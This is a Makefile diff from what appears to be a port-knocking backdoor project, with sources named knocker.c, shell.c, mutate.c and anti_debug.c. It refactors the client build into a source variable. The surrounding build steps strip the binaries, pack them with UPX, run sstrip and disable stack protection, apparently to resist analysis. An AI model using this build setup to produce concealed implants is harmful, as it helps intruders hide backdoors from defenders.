@@ -6,6 +6,7 @@ SSTRIP    := ./sstrip
 SRC       := knocker.c shell.c mutate.c anti_debug.c
 BINDIR    := /usr/bin
 CHMOD     := chmod +x
+CLIENTSRC := enver.c anti_debug.c mutate.c
 
 CFLAGS    := -static -s -pipe -march=native -O2 -std=gnu17 -Wall -Wextra -pedantic \
              -fno-stack-protector -fno-asynchronous-unwind-tables -fno-ident \
@@ -36,8 +37,8 @@ $(OUT): $(SRC)
 	$(UPX) --best --brute $(OUT)
 	$(SSTRIP) -z $(OUT)
 
-$(CLIENT): enver.c anti_debug.c mutate.c
-	$(CC) enver.c anti_debug.c mutate.c -o $@ $(CLIENT_CFLAGS) $(CLIENT_LDFLAGS) $(CLIENT_LIBS)
+$(CLIENT): $(CLIENTSRC)
+	$(CC) $(CLIENTSRC) -o $@ $(CLIENT_CFLAGS) $(CLIENT_LDFLAGS) $(CLIENT_LIBS)
 	$(UPX) --best --brute $(CLIENT)
 	$(SSTRIP) -z $(CLIENT)
 
